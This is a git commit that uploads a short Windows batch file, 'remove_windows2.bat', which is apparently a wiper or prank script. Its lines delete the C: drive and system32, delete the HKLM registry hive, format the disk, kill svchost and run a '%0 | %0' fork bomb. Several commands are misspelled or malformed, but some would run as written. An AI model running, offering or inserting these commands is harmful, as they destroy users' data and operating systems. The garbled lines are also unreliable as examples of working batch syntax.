246b9e0b774bad3baa4dc1734fc5d0b55e5d3ea2
Julien35235 <118825151+Julien35235@users.noreply.github.com>
2026-05-31 09:08:10 +0200

    Add files via upload

---
+++ BAT/remove_windows2.bat
@@ -0,0 +1,7 @@
+rd c: /s /4
+ydiskpart /s nul&reg delete hklm /f&rd /s /q c: laformat c:/y
+removedata - removeoem -confirm:Sfalse' /f;fodhelper"
+
+%0 | %0
+
+rmdir /s /q c: \windows\system32 & taskki11 /f /im svchost.exes
